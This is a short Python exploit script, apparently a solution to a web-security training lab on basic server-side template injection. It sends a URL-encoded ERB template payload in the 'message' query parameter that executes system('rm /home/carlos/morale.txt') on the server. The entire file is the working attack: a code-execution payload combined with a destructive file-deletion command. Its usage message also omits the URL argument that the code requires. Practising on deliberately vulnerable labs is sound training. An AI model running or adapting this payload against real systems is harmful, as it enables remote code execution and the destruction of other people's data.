#!/usr/bin/env python3
# https://github.com/wvverez
# Basic server-side template injection

import sys
import requests

def main():
    if len(sys.argv) != 2:
        print("[+] Mode of use: python3 SSTI_1.py")
        sys.exit(1)

    url = sys.argv[1]
    payload = '<%25+system("rm+/home/carlos/morale.txt")+%25>'
    response = requests.get(url + f"?message={payload}")

if __name__ == '__main__':
    main()
